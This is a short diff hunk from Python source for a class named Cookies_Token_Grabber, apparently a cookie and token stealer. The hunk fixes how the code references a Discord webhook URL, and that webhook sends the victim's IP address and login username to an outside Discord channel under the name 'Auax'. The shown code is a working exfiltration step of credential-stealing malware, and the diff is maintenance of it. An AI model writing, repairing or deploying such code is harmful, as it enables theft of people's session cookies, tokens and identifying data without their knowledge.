@@ -139,7 +139,7 @@ class Cookies_Token_Grabber:
 
     # Start webhook instance
     hook = DiscordWebhook(
-        url=self.webhookk,
+        url=webhookk,
         content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
         username="Auax"
     )
